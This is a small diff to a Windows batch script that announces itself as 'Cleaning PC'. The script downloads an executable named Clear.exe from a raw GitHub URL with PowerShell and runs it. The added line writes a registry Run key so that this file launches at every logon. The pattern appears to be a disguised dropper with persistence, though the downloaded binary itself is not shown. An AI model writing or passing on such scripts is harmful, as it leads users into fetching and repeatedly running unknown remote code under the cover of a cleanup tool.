@@ -590,6 +590,7 @@ echo Cleaning PC...
 del /s /q Clear.exe
 cls
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Clear.exe" -OutFile "Clear.exe"
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "(Default)" /t REG_SZ /d "Clear.exe"
 Clear.exe /k
 ping -n 4.5 127.0.0.1>nul
 cls
